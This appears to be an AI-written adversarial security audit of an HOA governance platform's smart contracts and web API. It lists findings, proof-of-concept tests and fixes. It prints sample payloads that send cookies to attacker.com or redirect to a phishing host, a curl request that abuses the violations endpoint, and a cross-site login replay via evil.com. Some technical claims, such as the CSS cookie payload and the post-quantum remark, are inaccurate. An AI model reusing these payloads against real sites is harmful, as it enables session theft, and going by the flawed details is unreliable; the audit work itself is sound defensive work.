# SuvrenHOA / Faircroft DAO — Sentinel Adversarial Security Audit

**Date:** 2026-04-06
**Auditor:** Sentinel (AI Adversarial Review)
**Scope:** All smart contracts, frontend API routes, auth logic, middleware, RLS policies
**Codebase:** `contracts/src/` (7 contracts) · `frontend/src/app/api/` (20 routes) · `supabase/migrations/` (5 files)
**Test file:** `contracts/test/SecurityAudit.t.sol`

---

## Executive Summary

The SuvrenHOA system is a well-structured HOA governance platform with thoughtful security foundations: soulbound NFTs, ReentrancyGuard on all fund-moving functions, Zod input validation, iron-session cookie signing, and RLS policies on Supabase. However, the adversarial review uncovered **4 Critical/High findings that render core subsystems non-functional or exploitable in production**.

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 3 |
| Medium | 6 |
| Low | 3 |
| Info | 4 |

---

## Table of Contents

1. [Smart Contract Findings](#smart-contract-findings)
   - [SC-01 DuesLending–Treasury Interface Mismatch (Critical)](#sc-01-dueslending-treasury-interface-mismatch)
   - [SC-02 Governor propose() Bypasses Rate Limit (High)](#sc-02-governor-propose-bypasses-rate-limit)
   - [SC-03 Governor Execution DoS via Counter Underflow (High)](#sc-03-governor-execution-dos-via-counter-underflow)
   - [SC-04 Restructured Loans Cannot Be Repaid (High)](#sc-04-restructured-loans-cannot-be-repaid)
   - [SC-05 VendorEscrow Refunds Bypass Treasury Accounting (High)](#sc-05-vendorescrow-refunds-bypass-treasury-accounting)
   - [SC-06 TreasuryYield Risk Cap on Shrinking Reserve (Medium)](#sc-06-treasuryyield-risk-cap-on-shrinking-reserve)
   - [SC-07 Abstain-Quorum One-Vote Governance Capture (Medium)](#sc-07-abstain-quorum-one-vote-governance-capture)
   - [SC-08 setTransfersRequireApproval(false) Breaks Soulbound (Medium)](#sc-08-settransfersrequireapprovalfalse-breaks-soulbound)
   - [SC-09 DocumentRegistry supersedes=0 Ambiguity (Low)](#sc-09-documentregistry-supersedes0-ambiguity)
   - [SC-10 DuesLending totalOutstanding Overstated (Low)](#sc-10-dueslending-totaloutstanding-overstated)
   - [SC-11 VendorEscrow Vendor == Inspector (Medium)](#sc-11-vendorescrow-vendor--inspector)
2. [Frontend / API Findings](#frontend--api-findings)
   - [FE-01 SIWE Domain Binding Not Enforced (High)](#fe-01-siwe-domain-binding-not-enforced)
   - [FE-02 Violation PATCH Has No Board Role Check (High)](#fe-02-violation-patch-has-no-board-role-check)
   - [FE-03 Session Secret Hardcoded Fallback (Critical/Config)](#fe-03-session-secret-hardcoded-fallback)
   - [FE-04 In-Memory Rate Limiter Bypassed Across Vercel Instances (Medium)](#fe-04-in-memory-rate-limiter-bypassed-across-vercel-instances)
   - [FE-05 link-wallet Allows Linking Arbitrary Addresses (Medium)](#fe-05-link-wallet-allows-linking-arbitrary-addresses)
   - [FE-06 DOMPurify style Attribute Allows CSS Exfiltration (Medium)](#fe-06-dompurify-style-attribute-allows-css-exfiltration)
   - [FE-07 Middleware Exposes All /api/ Routes (Info)](#fe-07-middleware-exposes-all-api-routes)
3. [AI Attack Vectors](#ai-attack-vectors)
4. [Economic Attacks](#economic-attacks)
5. [Quantum Threats](#quantum-threats)
6. [Infrastructure](#infrastructure)
7. [Confirmed Defences](#confirmed-defences)
8. [Prioritised Remediation Plan](#prioritised-remediation-plan)

---

## Smart Contract Findings

---

### SC-01 DuesLending–Treasury Interface Mismatch

**Severity:** Critical
**File:** `contracts/src/DuesLending.sol` (lines 240–245, 270–271, 308–310)
**Test:** `test_SC01_DuesLending_TreasuryInterfaceMismatch`

#### Description

`DuesLending` declares a local `IFaircroftTreasury` interface with three functions that **do not exist** on the deployed `FaircroftTreasury` contract:

```solidity
// In DuesLending.sol — DOES NOT EXIST on FaircroftTreasury
interface IFaircroftTreasury {
    function payDuesFor(uint256 tokenId, uint256 quarters, address payer) external;
    function withdrawForLoan(uint256 amount) external;
    function depositFromLoan(uint256 amount) external;
}
```

`FaircroftTreasury` has `payDues()`, `releaseReserveForYield()`, and `creditYieldReturn()` — none matching. Every call to `requestLoan()`, `makePayment()`, and `payOffLoan()` will revert at runtime with an EVM revert (fallback not defined).

#### Attack Vector

1. Homeowner calls `requestLoan(tokenId, 4, 12)`.
2. Contract reaches `treasury.withdrawForLoan(principal)` — call to non-existent selector → revert.
3. Transaction fails. Homeowner cannot get the loan. If the loan-lock were somehow set before the revert (it is set after the treasury call, so it isn't), the property would be permanently frozen.

#### Proof of Concept

```bash
forge test --match-test test_SC01 -vvv
# All three selectors return (bool ok = false) confirming missing functions
```

#### Impact

The entire DuesLending system is **non-functional**. No homeowner can request a loan. The contract is deployed but useless until FaircroftTreasury is updated with the three missing methods and corresponding role assignments.

#### Mitigation

Add the three functions to `FaircroftTreasury` with appropriate roles and ReentrancyGuard:

```solidity
// Add LENDING_ROLE to FaircroftTreasury
bytes32 public constant LENDING_ROLE = keccak256("LENDING_ROLE");

function withdrawForLoan(uint256 amount) external nonReentrant onlyRole(LENDING_ROLE) {
    if (amount > reserveBalance) revert InsufficientReserveBalance(amount, reserveBalance);
    reserveBalance -= amount;
    usdc.safeTransfer(msg.sender, amount);
}

function payDuesFor(uint256 tokenId, uint256 quarters, address payer) external nonReentrant onlyRole(LENDING_ROLE) {
    // internal dues logic using funds already held by DuesLending
}

function depositFromLoan(uint256 amount) external nonReentrant onlyRole(LENDING_ROLE) {
    usdc.safeTransferFrom(msg.sender, address(this), amount);
    reserveBalance += amount;
}
```

Grant `LENDING_ROLE` to the `DuesLending` contract address after deployment.

**Effort:** Medium (2–4 hours + re-deploy)

---

### SC-02 Governor propose() Bypasses Rate Limit

**Severity:** High
**File:** `contracts/src/FaircroftGovernor.sol` (line 126 vs OZ Governor.propose())
**Test:** `test_SC02_GovernorProposalBypassesMaxActive`

#### Description

`proposeWithCategory()` enforces `activeProposalCount < maxActiveProposals`, but the base OZ `propose()` function is `public` and performs no such check. Any NFT holder can call `propose()` directly, bypassing the rate limit entirely.

#### Attack Vector

1. Queue fills to `maxActiveProposals` (10) via `proposeWithCategory()`.
2. `proposeWithCategory()` is now blocked for everyone.
3. Attacker calls `propose()` directly — succeeds, creating proposals 11, 12, 13...
4. `activeProposalCount` stays at 10 (never incremented for direct proposals).
5. See SC-03 for the execution consequence.

Additional impact: proposals created via `propose()` use `ProposalCategory.Routine` as the default (enum value 0), bypassing any stricter quorum requirements the community has configured.

#### Mitigation

Override `propose()` to call `proposeWithCategory()` or enforce the same limit:

```solidity
function propose(
    address[] memory targets,
    uint256[] memory values,
    bytes[] memory calldatas,
    string memory description
) public override returns (uint256) {
    if (activeProposalCount >= maxActiveProposals) {
        revert TooManyActiveProposals(maxActiveProposals);
    }
    uint256 proposalId = super.propose(targets, values, calldatas, description);
    activeProposalCount++;
    return proposalId;
}
```

**Effort:** Low (30 min)

---

### SC-03 Governor Execution DoS via Counter Underflow

**Severity:** High
**File:** `contracts/src/FaircroftGovernor.sol` (lines 333–336)
**Test:** `test_SC03_GovernorExecutionDoSViaCounterUnderflow`

#### Description

`_executeOperations()` unconditionally decrements `activeProposalCount` for every executed proposal:

```solidity
function _executeOperations(...) internal override(...) {
    super._executeOperations(...);
    if (!proposalCleaned[proposalId]) {
        proposalCleaned[proposalId] = true;
        activeProposalCount--;  // ← Solidity 0.8: panics if count == 0
    }
}
```

When a proposal is created via `propose()` directly (SC-02), `activeProposalCount` is never incremented. If `activeProposalCount == 0` when any such proposal is executed, the decrement causes a Solidity 0.8 arithmetic underflow panic, reverting the entire `execute()` call.

#### Attack Vector

1. No proposals exist (`activeProposalCount == 0`).
2. Alice calls `propose()` directly.
3. Proposal passes governance unanimously.
4. `execute()` reaches `activeProposalCount--` → panic revert.
5. Proposal is permanently stuck in `Succeeded` state. Every subsequent `execute()` call reverts.
6. Community governance is DoS'd until an upgrade.

#### Proof of Concept

```bash
forge test --match-test test_SC03 -vvv
# vm.expectRevert() catches the panic on execute()
```

#### Mitigation

The fix for SC-02 (always incrementing in `propose()`) resolves SC-03 as a side effect. Additionally, add an underflow guard:

```solidity
if (!proposalCleaned[proposalId] && activeProposalCount > 0) {
    proposalCleaned[proposalId] = true;
    activeProposalCount--;
}
```

**Effort:** Low (part of SC-02 fix)

---

### SC-04 Restructured Loans Cannot Be Repaid

**Severity:** High
**File:** `contracts/src/DuesLending.sol` (lines 258–265, 302–305, 364–378)
**Test:** `test_SC04_RestructuredLoanIsUnrepayable`

#### Description

After `restructureLoan()` is called by governance, the loan status becomes `LoanStatus.Restructured` (enum value 3). Both `makePayment()` and `payOffLoan()` guard:

```solidity
if (loan.status != LoanStatus.Active && loan.status != LoanStatus.Defaulting)
    revert LoanNotActive();
```

`Restructured` matches neither `Active` (0) nor `Defaulting` (2), permanently blocking the borrower from repaying. The property's NFT remains loan-locked (transfer blocked) indefinitely — effectively seizing the property without recourse.

#### Impact

A governance action intended to help a struggling borrower (restructuring) makes the situation permanently worse. The only recovery path is another governance vote to write off the loan or call `setLoanLock(false)` directly.

#### Mitigation

Add `Restructured` to the repayment guard:

```solidity
if (loan.status != LoanStatus.Active &&
    loan.status != LoanStatus.Defaulting &&
    loan.status != LoanStatus.Restructured)
    revert LoanNotActive();
```

**Effort:** Trivial (5 min)

---

### SC-05 VendorEscrow Refunds Bypass Treasury Accounting

**Severity:** High
**File:** `contracts/src/VendorEscrow.sol` (lines 353–354, 386–387)
**Test:** `test_SC05_VendorEscrowRefundsBypassTreasuryAccounting`

#### Description

When `cancelWorkOrder()` or `resolveDispute(releaseToVendor=false)` refund USDC to the Treasury, they call:

```solidity
usdc.safeTransfer(treasury, refund);  // cancelWorkOrder
usdc.safeTransfer(treasury, amount);  // resolveDispute
```

`FaircroftTreasury` has no `receive()` hook and no function to credit incoming ERC-20 transfers. The USDC arrives at the treasury address but neither `operatingBalance` nor `reserveBalance` is updated.

#### Impact

- Refunded funds are permanently "dark": they exist in the contract's USDC balance but are invisible to the accounting system.
- `getTreasurySnapshot()` reports a `totalBalance` (via `usdc.balanceOf`) higher than `operating + reserve`, causing confusion and potential insolvency misreading.
- Funds cannot be spent, yielded, or recovered without a contract upgrade.
- Over time with many disputes, the discrepancy grows unboundedly.

#### Proof of Concept

```bash
forge test --match-test test_SC05 -vvv
# After simulated refund: balAfter > opAfter + resAfter
```

#### Mitigation

**Option A (preferred):** Add a crediting function to Treasury that VendorEscrow calls instead of a raw transfer:

```solidity
// In FaircroftTreasury
function creditFromEscrow(uint256 amount) external nonReentrant onlyRole(ESCROW_ROLE) {
    usdc.safeTransferFrom(msg.sender, address(this), amount);
    operatingBalance += amount; // or reserveBalance per governance choice
    emit EscrowCreditReceived(msg.sender, amount);
}
```

**Option B:** Have VendorEscrow hold a reference to Treasury and call `creditFromEscrow()` instead of raw `safeTransfer`.

**Effort:** Medium (2–3 hours)

---

### SC-06 TreasuryYield Risk Cap on Shrinking Reserve

**Severity:** Medium
**File:** `contracts/src/TreasuryYield.sol` (lines 192–201)
**Test:** `test_SC06_TreasuryYieldRiskCapBypassViaShrinkingReserve`

#### Description

The risk cap check uses `treasury.reserveBalance()` *before* the deposit removes funds from it:

```solidity
uint256 currentReserve = treasury.reserveBalance(); // snapshot before deposit
uint256 maxAllowed = _maxDeployable(currentReserve);
uint256 wouldDeposit = depositedAmount + amount;
if (wouldDeposit > maxAllowed) revert ExceedsRiskTolerance(...);

treasury.releaseReserveForYield(address(this), amount); // reserve shrinks here
```

After `releaseReserveForYield` executes, `reserveBalance` is smaller. The effective deployment ratio against the *remaining* reserve now exceeds the configured cap.

#### Example (Conservative = 30%)

| Step | Reserve | Deployed | Effective % |
|------|---------|---------|------------|
| Start | $152 | $0 | 0% |
| Deposit $45 (check: $45 < $152×30%=$45.6) | $107 | $45 | **42%** > 30% |

The TREASURER role can deploy up to ~43% of reserves under a "conservative" policy.

#### Mitigation

Check the ratio against `reserveBalance + depositedAmount` (total community reserve including deployed funds):

```solidity
uint256 totalCommunityReserve = treasury.reserveBalance() + depositedAmount;
uint256 maxAllowed = _maxDeployable(totalCommunityReserve);
```

**Effort:** Low (10 min)

---

### SC-07 Abstain-Quorum One-Vote Governance Capture

**Severity:** Medium
**File:** `contracts/src/FaircroftGovernor.sol` (lines 176–183, 188–201)
**Test:** `test_SC07_AbstainQuorumSingleForVotePassesRoutine`

#### Description

`_quorumReached()` counts `forVotes + againstVotes + abstainVotes`, but `_voteSucceeded()` only divides `forVotes / (forVotes + againstVotes)`. A coordinated minority can pass Routine proposals with a single FOR vote if enough others abstain:

1. Attacker holds ≥15% of lots → can reach 15% quorum alone by abstaining.
2. One accomplice votes FOR; everyone else stays silent or abstains.
3. `forVotes/(for+against) = 1/1 = 100% > 50%` → proposal succeeds.

In the production 150-lot community: any 23 homeowners abstaining satisfies the 15% quorum threshold (22.5 lots). A single FOR vote then controls the outcome.

**Important mitigation context:** NFTs are soulbound (require board approval for transfer), so capturing 15%+ of lots requires actual homeowner coordination, limiting the practical threat. However, a board member colluding with a small group of homeowners could exploit this.

#### Mitigation

Count abstain votes in the success denominator or raise the minimum participation bar:

```solidity
function _voteSucceeded(uint256 proposalId) internal view override returns (bool) {
    (uint256 against, uint256 forVotes, uint256 abstain) = proposalVotes(proposalId);
    uint256 totalParticipating = forVotes + against + abstain; // include abstain
    if (totalParticipating == 0) return false;
    return (forVotes * 10000) > (categoryThresholdBps[...] * totalParticipating);
}
```

Alternatively, require a minimum number of active FOR votes (not just a ratio).

**Effort:** Low (30 min) — requires careful review of Constitutional quorum math

---

### SC-08 setTransfersRequireApproval(false) Breaks Soulbound

**Severity:** Medium
**File:** `contracts/src/PropertyNFT.sol` (lines 207–210, 272–297)
**Test:** `test_SC08_DisablingSoulboundAllowsUnauthorisedTransfer`

#### Description

`setTransfersRequireApproval(false)` (callable only via governance/Timelock) converts all PropertyNFTs from soulbound tokens into freely-transferable ERC-721s. Any subsequent transfer succeeds without board approval, and `autoDelegateOnMint` re-delegates voting power to the new owner instantly.

#### Attack Scenario

1. Attacker submits a governance proposal to call `setTransfersRequireApproval(false)`.
2. If the proposal passes (e.g., via SC-07 quorum attack), all 150 lots become tradeable.
3. Attacker acquires lots on the open market (or in a secondary sale), gaining votes.
4. Attacker can now chain additional proposals while the community is unaware.

#### Mitigation

Add a timelock bypass prevention: require a higher category (Constitutional) for this specific parameter change, or hard-remove the setter entirely and document it as an irrevocable property.

If the setter is necessary, emit a loud on-chain warning event and consider requiring a community-wide re-vote after the parameter change before it takes effect.

**Effort:** Low (configuration/policy change)

---

### SC-09 DocumentRegistry supersedes=0 Ambiguity

**Severity:** Low
**File:** `contracts/src/DocumentRegistry.sol` (lines 135, 222–229)
**Test:** `test_SC09_DocumentRegistrySupersedes0Ambiguity`

#### Description

`supersedes = 0` serves dual duty: "no supersession" (original document) and "supersedes document ID 0" (the first registered document). The `getLatestVersion()` function uses:

```solidity
if (sup > 0 && sup == uint48(latest)) { latest = i; }
```

The `sup > 0` guard means a document registered with `supersedes=0` is *never* included in a version chain traversal, even if the caller intends it to replace the original document. A homeowner querying `getLatestVersion(0)` always gets the original document, missing any revision.

#### Mitigation

Use `type(uint48).max` (or a sentinel value like `uint48(0xFFFFFFFFFFFF)`) to mean "no supersession" instead of 0, freeing 0 to be a valid supersession target. Or bump docIds to be 1-indexed.

**Effort:** Medium (breaks existing document chains — migration needed)

---

### SC-10 DuesLending totalOutstanding Overstated

**Severity:** Low
**File:** `contracts/src/DuesLending.sol` (lines 234–235, 322–333)
**Test:** `test_SC10_TotalOutstandingOverstatedDuringRepayment`

#### Description

`totalOutstanding` is incremented by `principal` at loan request time and decremented only in `_settleLoan()` (full payoff) or `writeOffLoan()` (partial). Per-installment `makePayment()` calls return USDC to the treasury but do not decrement `totalOutstanding`.

Effect: `_loanPoolAvailable()` returns a value lower than reality, potentially blocking new loan requests even when most of a prior loan's principal has been repaid. In a community with 15% of reserve allocated to loans, this could prevent all new borrowers.

#### Mitigation

Track `outstandingPrincipal` as a separate field and decrement it proportionally on each payment, or decrement `totalOutstanding` by the principal portion of each installment:

```solidity
uint256 principalPortion = (amount * loan.principal) / loan.totalOwed;
totalOutstanding -= principalPortion;
```

**Effort:** Low (30 min + retest)

---

### SC-11 VendorEscrow Vendor == Inspector

**Severity:** Medium
**File:** `contracts/src/VendorEscrow.sol` (lines 204–249)
**Test:** `test_SC11_VendorAsOwnInspectorSelfApprovesMilestones`

#### Description

`createWorkOrder()` validates `inspector != address(0)` but does not check `inspector != vendor`. A compromised or colluding board member can appoint the vendor as their own inspector, allowing the vendor to immediately call `approveMilestone()` and release all escrowed funds to themselves without independent review.

#### Proof of Concept

```solidity
// Board creates work order with vendor == inspector
escrow.createWorkOrder(vendor, "Pool Work", "...", milestones, vendor);
// Vendor self-approves all milestones
vm.prank(vendor);
escrow.approveMilestone(workOrderId, 0); // funds transferred to vendor immediately
```

#### Mitigation

```solidity
if (inspector == vendor) revert InspectorCannotBeVendor();
```

**Effort:** Trivial (5 min)

---

## Frontend / API Findings

---

### FE-01 SIWE Domain Binding Not Enforced

**Severity:** High
**File:** `frontend/src/lib/auth.ts` (line 29)

#### Description

The SIWE verification passes only `{ signature, nonce }` to `siweMessage.verify()`:

```typescript
const { data } = await siweMessage.verify({ signature, nonce });
```

The `siwe` v2 library does NOT automatically validate the `domain`, `uri`, or `chainId` fields unless they are explicitly passed as verification options. An attacker who obtains a valid nonce from the server can construct a SIWE message with:
- `domain: "evil.com"` (or any domain)
- `uri: "https://evil.com/login"`
- `chainId: 1` (or any chain)
- The legitimate nonce

The server will accept this signature as valid and create a session for the attacker.

#### Attack Vector (Cross-Site SIWE Replay)

1. Victim visits `evil.com`.
2. `evil.com` fetches a nonce from `suvren.hoa/api/auth/nonce`.
3. Evil site prompts victim to sign a SIWE message for `evil.com`.
4. Victim signs — they think they're logging into evil.com.
5. Evil site replays the signature to `suvren.hoa/api/auth/verify`.
6. Server accepts it (nonce matches) and creates a session for the victim's address on SuvrenHOA.
7. Evil site now has a valid SuvrenHOA session cookie.

#### Mitigation

```typescript
export async function verifySiweMessage(
  message: string,
  signature: string,
  nonce: string
): Promise<string> {
  const siweMessage = new SiweMessage(message);
  const { data } = await siweMessage.verify({
    signature,
    nonce,
    domain: process.env.NEXT_PUBLIC_APP_DOMAIN, // e.g. "suvren.hoa"
    time: new Date().toISOString(),
  });
  return data.address;
}
```

**Effort:** Trivial (5 min)

---

### FE-02 Violation PATCH Has No Board Role Check

**Severity:** High
**File:** `frontend/src/app/api/violations/route.ts` (lines 103–166)

#### Description

The `PATCH` handler only requires authentication (any valid wallet session), not board membership. Any authenticated homeowner can update violation status, set fines, modify cure deadlines, and schedule hearings:

```typescript
export const PATCH = withAuth(async (request, { address }) => {
  // ← No board membership check
  const { id, status, notes, fine_amount, ... } = parsed.data;
  await supabaseAdmin.from('hoa_violations').update(updates).eq('id', id);
```

A resident with a violation can:
- Set their own violation status to `"resolved"` or `"dismissed"`
- Set `fine_amount: 0` to erase their fine
- Schedule hearings to delay enforcement

#### Attack Vector

```bash
# Authenticated resident dismisses their own violation
curl -X PATCH /api/violations \
  -H "Cookie: suvren_session=<valid_session>" \
  -d '{"id": "vio-uuid", "status": "dismissed", "notes": "Resolved by homeowner"}'
```

#### Mitigation

Add a board membership check. The existing `board-check` endpoint provides the lookup:

```typescript
export const PATCH = withAuth(async (request, { address }) => {
  const { data: boardMember } = await supabaseAdmin
    .from('hoa_board_members')
    .select('id')
    .eq('active', true)
    .ilike('wallet_address', address)
    .limit(1)
    .single();

  if (!boardMember) {
    return NextResponse.json({ error: 'Board access required' }, { status: 403 });
  }
  // ...
```

**Effort:** Low (30 min)

---

### FE-03 Session Secret Hardcoded Fallback

**Severity:** Critical (configuration) / High (if deployed without setting env var)
**File:** `frontend/src/lib/auth.ts` (line 12)

#### Description

```typescript
password: process.env.SESSION_SECRET || 'complex_password_at_least_32_characters_long_replace_me',
```

If `SESSION_SECRET` is absent from the environment, all sessions are signed with a well-known default key that is publicly visible in the source code. Anyone can:

1. Read the default key from the public GitHub repository.
2. Forge an arbitrary `iron-session` cookie with any wallet address.
3. Authenticate as any user — including board members — without owning their wallet.

#### Mitigation

1. Make startup fail-fast if `SESSION_SECRET` is unset:

```typescript
const secret = process.env.SESSION_SECRET;
if (!secret || secret.length < 32) {
  throw new Error('SESSION_SECRET env var is required (min 32 chars)');
}
export const sessionOptions: SessionOptions = {
  cookieName: 'suvren_session',
  password: secret,
  ...
};
```

2. Rotate the session secret immediately in all environments.
3. Add `SESSION_SECRET` to deployment checklists and CI/CD required-vars checks.

**Effort:** Trivial (10 min)

---

### FE-04 In-Memory Rate Limiter Bypassed Across Vercel Instances

**Severity:** Medium
**File:** `frontend/src/lib/rate-limit.ts` (line 11)

#### Description

```typescript
const buckets = new Map<string, TokenBucket>();
```

The rate limiter is process-local. Vercel serverless functions run in many parallel instances; each has its own `buckets` map. An attacker making parallel requests to different instances (easily done by distributing requests) gets the full quota per instance.

With Vercel's auto-scaling, a single IP could achieve `5 requests × N instances` per minute on the `strict` limit (auth verify), effectively bypassing brute-force protection on SIWE verification.

#### Mitigation

Replace with a distributed rate limiter backed by Redis/KV:

```typescript
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 m'),
});
```

The `@upstash/ratelimit` package is already the recommended upgrade mentioned in the rate-limit.ts comment.

**Effort:** Low (1–2 hours + Upstash provisioning)

---

### FE-05 link-wallet Allows Linking Arbitrary Addresses

**Severity:** Medium
**File:** `frontend/src/app/api/profile/link-wallet/route.ts` (lines 24–25)

#### Description

```typescript
const walletAddress = normalizeAddress(parsed.data.wallet_address || address);
```

If the caller provides `wallet_address` in the request body (different from their authenticated `address`), the endpoint links that foreign address to their profile. A malicious authenticated user can:
- Link any wallet address to their profile
- If board status is checked by `wallet_address` in `hoa_profiles`, claim a board member's wallet
- Steal community reputation/permissions tied to wallet address

#### Mitigation

Ignore the `wallet_address` parameter and always use the authenticated address:

```typescript
const walletAddress = address; // always use the authenticated wallet
```

If users genuinely need to link a different wallet, require a SIWE signature from the new wallet before linking.

**Effort:** Trivial (5 min)

---

### FE-06 DOMPurify style Attribute Allows CSS Exfiltration

**Severity:** Medium
**File:** `frontend/src/lib/sanitize.ts` (line 18)

#### Description

```typescript
ALLOWED_ATTR: ['style', 'class'],
```

Allowing `style` attributes exposes the application to CSS-based attacks:

```html
<!-- Exfiltration via CSS import -->
<div style="background:url('https://attacker.com/steal?d='+document.cookie)">

<!-- Redirect via CSS expression (legacy IE) -->
<span style="width:expression(window.location='https://phishing.com')">

<!-- Overlay phishing UI -->
<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;
     background:white;z-index:9999">Fake login form</div>
```

Proposal descriptions, violation reports, and announcements are rendered with this sanitizer, making them vectors for stored CSS injection.

#### Mitigation

Remove `style` from `ALLOWED_ATTR`. Use CSS classes for any required styling:

```typescript
export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'span', 'br', 'p', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['class'], // no style
  });
}
```

**Effort:** Trivial (5 min)

---

### FE-07 Middleware Exposes All /api/ Routes

**Severity:** Info
**File:** `frontend/src/lib/supabase-middleware.ts` (line 35)

#### Description

```typescript
const publicRoutes = ['/login', '/signup', '/invite/accept', '/api/'];
const isPublicRoute = pathname === '/' || publicRoutes.some(r => pathname.startsWith(r));
```

All routes under `/api/` bypass the middleware's Supabase session check. Individual routes implement their own `withAuth` wrappers, but endpoints like `GET /api/violations`, `GET /api/board-check`, and `GET /api/directory` have no auth requirement whatsoever — they expose HOA member data, board rosters, and violation records to anonymous callers.

**Note:** This is likely intentional for some public-facing data. The finding is flagged so the team can explicitly confirm which endpoints should be public vs. auth-gated.

#### Recommendation

Audit each API route and add `withAuth` or a `supabaseAnon` check to those that should require authentication. At minimum, violation details and directory listings should require community membership.

---

## AI Attack Vectors

### AI-01 Automated Proposal Spam

**Severity:** Low (mitigated by soulbound NFTs)

An AI bot with access to 1 NFT could automate proposal creation via the direct `propose()` path (SC-02), flooding governance with noise proposals. Since NFT acquisition requires board approval, the blast radius is limited to board-approved members. Mitigated by fixing SC-02.

### AI-02 Deepfake Document Registration

**Severity:** Medium (insider threat)

`DocumentRegistry` stores a SHA-256 hash of document content. A RECORDER with access (board multisig) could compute the hash of deepfake content (e.g., falsified meeting minutes, amended CC&Rs) and register it on-chain with an Arweave link pointing to the fake document. On-chain, the document appears legitimate.

**Mitigation:** Require multiple RECORDER signatures (a 2-of-N multisig) before registering amendment or CCR documents. Consider adding a `pending_ratification` state.

### AI-03 On-Chain Voting Pattern Front-Running

**Severity:** Low

All votes are public on-chain. An AI could monitor voting momentum and submit a governance proposal specifically timed to pass when key opponents are offline or have already revealed their hand. The 7-day voting window limits the advantage. No mitigation required beyond standard governance hygiene.

### AI-04 Bot Farm Abuse of Founding Program

**Severity:** Medium (infrastructure)

If the founding homeowner program has a referral bonus or incentive structure, bots could register many Supabase accounts with different email addresses to claim multiple founding slots. The NFT minting bottleneck (board approval) is the primary defence; the invite system should add rate limiting per inviter.

---

## Economic Attacks

### ECON-01 Whale Governance Capture (Low risk — mitigated by soulbound)

An entity controlling multiple lot NFTs could dominate governance. The soulbound transfer restriction (SC-08 is the relevant bypass) and board approval requirement make this difficult without board collusion. Quorum requirements scale with total supply, providing additional protection.

### ECON-02 DuesLending Interest Rate Manipulation (Low)

Governance can set `interestRateBps` up to 2000 (20% APR) via `setInterestRate()`. A governance-captured board could raise rates to punitive levels, effectively taxing struggling homeowners who rely on lending. Mitigated by the 20% cap and governance process requirements.

### ECON-03 TreasuryYield Aave Volatility Risk (Low)

During extreme market events, USDC could temporarily de-peg or Aave could have a bad-debt event reducing aUSDC value below principal. `depositedAmount` would then overstate the actual Aave position. `emergencyWithdraw()` handles this correctly with `type(uint256).max` withdrawal, but note that yield harvesting fails (`NoYieldAvailable`) during loss events. No code fix required; covered by `emergencyWithdraw()`.

### ECON-04 VendorEscrow Milestone Griefing (Low)

A vendor can call `disputeMilestone()` on any pending milestone, setting the work order status to `Disputed` and blocking the inspector from approving further milestones until governance resolves the dispute. A malicious vendor could grief a work order indefinitely by disputing each milestone the moment it becomes pending. The 7-day governance timelock means each dispute takes at least 9 days to resolve.

**Mitigation:** Allow the inspector to override vendor disputes within a short window (e.g., 48 hours) without governance involvement.

### ECON-05 Dues Free-Rider Problem (Design/Low)

Homeowners who never pay dues are never automatically penalised on-chain. The `isDuesCurrent()` view exists but nothing enforces payment beyond the late fee in `payDues()`. In the worst case, all 150 homeowners could accumulate unlimited dues arrears with no automatic enforcement mechanism. This is a governance/social problem; on-chain automated enforcement would require a governance vote to invoke.

---

## Quantum Threats

### Q-01 ECDSA Vulnerability Timeline (Info)

All wallet signatures (SIWE, on-chain transactions, governance votes) use ECDSA with secp256k1. A cryptographically-relevant quantum computer running Shor's algorithm could break private keys from public keys in polynomial time.

**Current timeline:** No quantum computer capable of breaking 256-bit ECDSA exists today; conservative estimates place this 10–20 years away.

**Impact when it arrives:**
- All Ethereum wallets — including the board multisig — are compromised.
- PropertyNFT ownership proofs are breakable.
- SIWE session forgery becomes trivial.
- Historical votes could be retroactively attributed to forged signers.

**Post-quantum migration path:**
1. Monitor EIP/ERC proposals for post-quantum signature schemes (e.g., EIP-7212 secp256r1 is a precursor; EIP for Falcon/Dilithium is in early discussion).
2. Plan a PropertyNFT migration to a post-quantum-aware token standard once the Ethereum community converges on one.
3. For SIWE: WebAuthn (passkeys) provides a hardware-based alternative that can be upgraded to PQ algorithms when OS/browser support arrives.

---

## Infrastructure

### INF-01 Stripe/Resend/Alchemy Third-Party Compromise (Medium)

The system integrates Stripe (billing), Resend (email), and Alchemy (RPC). A compromise of any of these providers could expose:
- Stripe: subscription data, billing info, potential webhook replay attacks to change subscription status.
- Resend: email delivery hijacking for invitation/reset flows.
- Alchemy: RPC data manipulation (stale/incorrect block data fed to frontend; on-chain state is unaffected).

**Mitigation:** Verify Stripe webhook signatures. Use Resend DKIM/DMARC. Use Alchemy's rate-limited keys, not a shared key.

### INF-02 GitHub Actions Secrets Exposure (Info)

`ALCHEMY_API_KEY`, `BASESCAN_API_KEY`, `SESSION_SECRET`, and other secrets in GitHub Actions are broadly accessible to anyone with write access to the repository. A supply-chain attack (malicious dependency or compromised contributor) could exfiltrate these.

**Mitigation:** Use GitHub Environments with required reviewers for secrets used in deploy jobs. Audit secret access logs periodically.

### INF-03 NEXT_PUBLIC_ Env Vars (Info)

`NEXT_PUBLIC_SUPABASE_URL` and `NEXT_PUBLIC_SUPABASE_ANON_KEY` are exposed to all clients. This is intentional and correct for the Supabase anon key (RLS protects the data). Ensure `SESSION_SECRET`, `STRIPE_SECRET_KEY`, `ALCHEMY_API_KEY`, and `SUPABASE_SERVICE_ROLE_KEY` are **never** prefixed with `NEXT_PUBLIC_`.

---

## Confirmed Defences

The following security measures were verified to work correctly:

| ID | Defence | Test |
|----|---------|------|
| DEF-01 | `ReentrancyGuard` blocks reentrant `payDues()` | `test_DEF01_ReentrancyGuardBlocksReentrantPayDues` |
| DEF-02 | Loan-lock prevents NFT transfer even with board approval | `test_DEF02_LoanLockBlocksTransferEvenWithBoardApproval` |
| DEF-03 | Soulbound transfer restriction (baseline) | `test_SC08_DisablingSoulboundAllowsUnauthorisedTransfer` (part a) |
| DEF-04 | SafeERC20 prevents token-return false-value attacks | OZ library guarantee |
| DEF-05 | AccessControl role checks on all admin functions | Multiple tests |
| DEF-06 | Zod schema validation on all API inputs | Input fuzzing not covered but schemas look complete |
| DEF-07 | Iron-session cookie signing prevents cookie tampering | Confirmed unless SESSION_SECRET is unset (FE-03) |
